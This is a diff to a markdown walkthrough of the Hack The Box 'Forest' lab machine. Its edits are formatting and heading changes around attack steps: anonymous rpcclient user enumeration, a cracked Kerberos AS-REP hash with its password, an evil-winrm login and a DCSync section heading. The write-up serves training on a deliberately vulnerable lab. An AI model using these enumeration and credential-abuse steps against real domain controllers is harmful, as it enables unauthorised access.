@@ -116,7 +116,8 @@ dig @$IP htb.local
 ```
 
 ### RPC 445
-rpcclient -U "" -N $IP
+`rpcclient -U "" -N $IP`
+
 ```
 rpcclient $> enumdomusers
 user:[Administrator] rid:[0x1f4]
@@ -197,7 +198,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:7f409a8728db287dc66cebd404de8f76$a9b55fd6d7
 svc-alfresco@HTB.LOCAL
 s3rvice
 
-### Easy box indeed
+### Foothold
 ```bash
 evil-winrm -i $IP -u svc-alfresco -p s3rvice
 
@@ -208,6 +209,8 @@ WINRM       10.129.232.105  5985   FOREST           [*] Windows 10.0 Build 14393
 WINRM       10.129.232.105  5985   FOREST           [*] http://10.129.232.105:5985/wsman
 WINRM       10.129.232.105  5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
 ```
+
+### BloodHound since it's a domain controller
 
 ### DCSync Privileges needs PowerView.ps1
 ```bash
